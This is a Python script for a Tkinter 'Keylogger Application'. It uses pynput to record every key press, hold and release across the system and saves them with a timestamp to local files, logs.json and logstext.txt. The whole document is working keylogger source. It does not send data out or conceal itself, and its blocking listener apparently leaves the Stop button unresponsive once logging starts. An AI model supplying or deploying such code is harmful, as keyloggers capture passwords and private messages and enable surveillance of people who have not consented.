import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
from datetime import datetime

root = tk.Tk() 
root.geometry("400x200")
root.title("KEYLOGGER APPLICATION")
root.configure(bg="light blue")

key_list = []
x = False
key_strokes = " "

dt = datetime.now()

def update_txt_file(key):
    with open('logstext.txt','w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json','+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x, key_list
    if x == False:
        print("\n")
        key_list.append({'Pressed': f'{key}'})

    x = True
    if x == True:
        print("\n")
        key_list.append({'Held': f'{key}'})

    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    print("\n")
    key_list.append({'Released': f'{key}'})

    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + "\n" + str(key)
    update_txt_file(str(dt) + str(key_strokes))

def butaction():    

    print("[+] Keylogger running successfully!!! \n Saving key logs in 'logs.json'")

    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()


f1 = Frame()
f2 = Frame()
f1.grid(padx=(150,0),pady=(50,10))
f2.grid(padx=(150,0),pady=(20,5))

b1 = Button(f1,text="Start Keylogger",command= butaction,width=12)
b1.pack()
b2 = Button(f2,text="Stop",command = root.destroy,width=12)
b2.pack()
root.mainloop()
